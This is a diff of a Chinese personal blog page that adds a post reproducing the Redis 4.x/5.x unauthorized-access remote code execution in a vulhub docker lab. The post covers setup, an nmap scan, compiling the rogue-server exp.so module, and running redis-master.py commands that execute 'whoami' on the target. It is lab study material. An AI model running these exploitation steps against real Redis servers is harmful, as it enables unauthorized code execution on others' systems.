@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="l0odrd的博客">
+    <meta name="keywords" content="redis 4-unacc, l0odrd的博客">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>l0odrd的博客</title>
+    <title>redis 4-unacc | l0odrd的博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -266,12 +266,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/18.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title"></h1>
+                    <h1 class="description center-align post-title">redis 4-unacc</h1>
                 </div>
             </div>
         </div>
@@ -385,9 +385,13 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/redis/">
+                                <span class="chip bg-color">redis</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -399,28 +403,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-05-03
+                    2021-06-28
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-02-24
+                    2021-06-28
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    17
+                    753
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    3 分
                 </div>
                 
 
@@ -440,7 +444,56 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">title: 关于</span><br><span class="line">date: 2021-02-08 00:00:00</span><br><span class="line">type: &quot;about&quot;</span><br><span class="line">layout: &quot;about&quot;</span><br></pre></td></tr></table></figure>
+                <h1 id="Redis-4-unacc"><a href="#Redis-4-unacc" class="headerlink" title="Redis 4-unacc"></a>Redis 4-unacc</h1><p>测试环境：</p>
+<h2 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h2><p>使用docker和docker-compose运行漏洞环境vulhub</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">进入vulhub中Redis的4-unacc目录</span><br><span class="line">docker-compose build &#x2F;&#x2F;对靶场进行编译</span><br><span class="line">docker-compose up -d &#x2F;&#x2F;运行靶场</span><br><span class="line">docker-compose down &#x2F;&#x2F;移除靶场</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://i.loli.net/2021/06/28/qJgE9XUH8Nwrl4s.png"></p>
+<p><img src="https://i.loli.net/2021/06/28/eTB7CAV3FbQmRlt.png" alt="image-20210628210758753"></p>
+<h2 id="安装Redis"><a href="#安装Redis" class="headerlink" title="安装Redis"></a>安装Redis</h2><p>攻击机也要安装Redis</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-2.8.12.tar.gz #下载</span><br><span class="line">2.tar -xzf redis-2.8.12.tar.gz #解压</span><br><span class="line">3.cd到redis-2.8.12 目录下</span><br><span class="line">4.输入命令make #安装</span><br><span class="line">5.进入redis-2.8.12&#x2F;src&#x2F;目录下</span><br><span class="line">6.输入命令&#96;.&#x2F;redis-cli -h&#96;，出现帮助内容就表示可以使用了</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/06/28/8HXJehCYPLgbwRn.png" alt="image-20210628131141013"></p>
+<h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p>nmap可以扫描出靶机6379的Redis服务器</p>
+<p><img src="https://i.loli.net/2021/06/28/eJ7SLuprHd4xIWw.png" alt="image-20210628142638144"></p>
+<h2 id="Redis直接连接"><a href="#Redis直接连接" class="headerlink" title="Redis直接连接"></a>Redis直接连接</h2><p>可以使用kali中的Redis直接连接<code>./redis-cli -h ip</code></p>
+<p>使用<code>info</code>可以查看到一些服务器的敏感信息</p>
+<p><img src="https://i.loli.net/2021/06/28/92slmStOpfTcWnA.png" alt="image-20210628142952657"></p>
+<h2 id="下载exp到本地"><a href="#下载exp到本地" class="headerlink" title="下载exp到本地"></a>下载exp到本地</h2><p><img src="https://i.loli.net/2021/06/28/unGywmoYF3XRehd.png" alt="image-20210628143941751"></p>
+<h2 id="make编译exp"><a href="#make编译exp" class="headerlink" title="make编译exp"></a>make编译exp</h2><p>cd到<code>redis-rogue-server /RedisModulesSDK/exp/</code>目录下，使用make进行编译，该目录下会多出<code>exp.o</code>和<code>exp.so</code>两个文件</p>
+<p><img src="https://i.loli.net/2021/06/28/wOQgcMWfEeASXGb.png" alt="image-20210628144722979"></p>
+<p><img src="https://i.loli.net/2021/06/28/uC1FEcHXLQidvGM.png" alt="image-20210628144753019"></p>
+<p>返回到<code>redis-rogue-server.py</code>目录下</p>
+<p><code>./redis-rogue-server.py --rhost  --lhost </code></p>
+<p><img src="https://i.loli.net/2021/06/28/u1UFq7KBPRaIC8p.png" alt="image-20210628145723698"></p>
+<p>然后就卡住了。。</p>
+<p>换了个exp</p>
+<p><code>git clone https://github.com/vulhub/redis-rogue-getshell.git</code></p>
+<p><img src="/2021/06/28/redis-4-unacc/Users\王\AppData\Roaming\Typora\typora-user-images\image-20210628191840574.png" alt="image-20210628191840574"></p>
+<p><code>./redis-master.py -r 靶机IP -p 6379 -L 攻击机IP -P 8989 -f RedisModulesSDK/exp/exp.so -c &quot;whoami&quot;</code></p>
+<p><img src="https://i.loli.net/2021/06/28/7Rr1X2tn9oMcCYb.png" alt="image-20210628200252772"></p>
+<p>然后就又卡住了。。。</p>
+<h2 id="在另一台kali上搭建docker"><a href="#在另一台kali上搭建docker" class="headerlink" title="在另一台kali上搭建docker"></a>在另一台kali上搭建docker</h2><p>结果原来的阿里源不能用了，又折腾了半天换源。。（图中的是中科大的源也还是不行）</p>
+<p><img src="https://i.loli.net/2021/06/28/qJRZCSbj37pl6fk.png" alt="image-20210628203059513"></p>
+<p>最后也是糊里糊涂添加了一堆源</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#中科大</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">#阿里云</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">#清华大学</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line">#163</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian wheezy main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian wheezy main non-free contrib</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian wheezy-proposed-updates main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian wheezy-proposed-updates main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian-security wheezy&#x2F;updates main non-free contrib</span><br><span class="line">#东软大学</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.neusoft.edu.cn&#x2F;kali kali-rolling&#x2F;main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.neusoft.edu.cn&#x2F;kali kali-rolling&#x2F;main non-free contrib</span><br></pre></td></tr></table></figure>
+<p>然后就可以了。。。淦</p>
+<p>直连成功</p>
+<p><img src="https://i.loli.net/2021/06/28/jGkwFEeo6zlWJVa.png" alt="image-20210628204907522"></p>
+<p><code>./redis-master.py -r 192.168.229.137 -p 6379 -L 192.168.229.129 -P 8989 -f RedisModulesSDK/exp/exp.so -c &quot;whoami&quot;</code></p>
+<p><img src="https://i.loli.net/2021/06/28/xaeSJCN8zQfIvbE.png" alt="image-20210628205215675"></p>
+<p>不过是<code>eredis</code>是什么鬼？？？</p>
+<p>第一个exp也可以利用</p>
+<p><img src="https://i.loli.net/2021/06/28/kE2gR3pcPFxudeh.png" alt="image-20210628210157607"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感觉自己啥都没做，差太多了，还有</p>
+<blockquote>
+<p>这里只是使用vulhub漏洞环境，只能通过该exp来getshell，像通过写文件、ssh key或定时计划来getshell,都是不成功的，会提示没有权限</p>
+</blockquote>
+<p>考完就尝试另外三个方法</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yiiiing/article/details/108218674">Redis 4.x5.x 未授权访问漏洞EXP复现过程</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/roukmanx/article/details/103682318">Redis 4.x/5.x 未授权访问漏洞</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/rnss/p/13612703.html">redis 4-unacc 复现</a></p>
+
                 
             </div>
             <hr/>
@@ -466,7 +519,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://King10280.github.io/about/index.html">https://King10280.github.io/about/index.html</a>
+                    <a href="https://King10280.github.io/2021/06/28/redis-4-unacc/">https://King10280.github.io/2021/06/28/redis-4-unacc/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -503,7 +556,11 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/redis/">
+                                    <span class="chip bg-color">redis</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -547,18 +604,17 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/about/index.html">
+                <a href="/2021/06/28/%E7%AB%AF%E5%8F%A3%E9%82%A3%E4%BA%9B%E4%BA%8B/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="端口那些事">
                         
-                        <span class="card-title"></span>
+                        <span class="card-title">端口那些事</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -568,9 +624,9 @@
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-03
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-06-28
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -579,7 +635,6 @@
                         </span>
                     </div>
                 </div>
-
                 
             </div>
         </div>
@@ -587,16 +642,16 @@
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/about/index.html">
+                <a href="/2021/06/24/web%E5%85%A5%E9%97%A8sql%E6%B3%A8%E5%85%A5/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="web入门sql注入">
                         
-                        <span class="card-title"></span>
+                        <span class="card-title">web入门sql注入</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -607,7 +662,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-03
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-24
                             </span>
                         <span class="publish-author">
                             
@@ -617,7 +672,14 @@
                         </span>
                     </div>
                 </div>
-
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/sql/">
+                        <span class="chip bg-color">sql</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
